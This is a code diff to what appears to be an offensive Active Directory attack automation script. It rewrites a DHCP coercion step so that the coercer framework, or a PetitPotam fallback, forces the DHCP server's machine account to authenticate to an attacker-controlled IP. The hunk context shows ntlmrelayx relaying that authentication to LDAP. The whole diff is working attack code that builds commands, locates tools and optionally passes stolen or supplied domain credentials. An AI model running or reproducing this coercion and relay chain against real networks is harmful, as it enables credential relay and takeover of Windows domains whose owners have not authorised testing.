@@ -3930,10 +3930,11 @@ def detect_dhcp_server(cfg: Config) -> str:
 
 
 def run_dhcp_coercion(cfg: Config) -> bool:
-    """Coerce DHCP server to authenticate via Kerberos/NTLM using DHCP relay abuse.
+    """Coerce DHCP server to authenticate via Kerberos/NTLM.
 
-    Uses dhcp_coerce.py (Akamai research) to trigger the DHCP server's machine
-    account to authenticate to the attacker, then relay to LDAP.
+    Uses coercer framework (which includes DHCP coercion methods) or
+    direct PetitPotam/DFSCoerce against the DHCP server to trigger its
+    machine account to authenticate to the attacker, then relay to LDAP.
     """
     phase_header("DHCP COERCION")
 
@@ -3942,18 +3943,15 @@ def run_dhcp_coercion(cfg: Config) -> bool:
         log.warning("No DHCP server found — skipping DHCP coercion")
         return False
 
-    dhcp_coerce = find_tool(
-        "dhcp_coerce.py",
-        paths=[
-            TOOLS_DIR / "dhcp_coerce" / "dhcp_coerce.py",
-            TOOLS_DIR / "DHCPCoerce" / "dhcp_coerce.py",
-        ]
-    )
-
-    if not dhcp_coerce:
-        log.warning("dhcp_coerce.py not found — skipping DHCP coercion")
-        detail("Install: git clone https://github.com/p0dalirius/DHCPCoerce /opt/tools/DHCPCoerce")
-        return False
+    if not tool_exists("coercer") and not tool_exists("PetitPotam.py"):
+        petitpotam = find_tool("PetitPotam.py", paths=[
+            Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
+            TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
+        ])
+        if not petitpotam:
+            log.warning("No coercion tool found — skipping DHCP coercion")
+            detail("Install: pipx install coercer")
+            return False
 
     relay_output = cfg.work_dir / "dhcp-relay.txt"
     bg_procs = []
@@ -3982,12 +3980,27 @@ def run_dhcp_coercion(cfg: Config) -> bool:
             log.error(f"ntlmrelayx exited immediately")
             return False
 
-        # Trigger DHCP coercion
-        log.info(f"🔨 Triggering DHCP coercion on {dhcp_server}...")
-        coerce_cmd = dhcp_coerce.split() + [
-            "-t", dhcp_server,
-            "-l", cfg.attacker_ip,
-        ]
+        # Trigger coercion against the DHCP server
+        log.info(f"🔨 Triggering coercion on DHCP server {dhcp_server}...")
+        if tool_exists("coercer"):
+            coerce_cmd = [
+                "coercer", "coerce",
+                "-t", dhcp_server, "-l", cfg.attacker_ip,
+            ]
+            if cfg.has_creds:
+                coerce_cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
+        else:
+            # Fallback to PetitPotam
+            petitpotam = find_tool("PetitPotam.py", paths=[
+                Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
+                TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
+            ])
+            coerce_cmd = petitpotam.split() + [cfg.attacker_ip, dhcp_server]
+            if cfg.has_creds:
+                coerce_cmd = petitpotam.split() + [
+                    "-u", cfg.username, "-p", cfg.password, "-d", cfg.domain,
+                    cfg.attacker_ip, dhcp_server
+                ]
 
         result = run(coerce_cmd, cfg, timeout=60,
                     outfile=cfg.work_dir / "dhcp-coerce.txt")
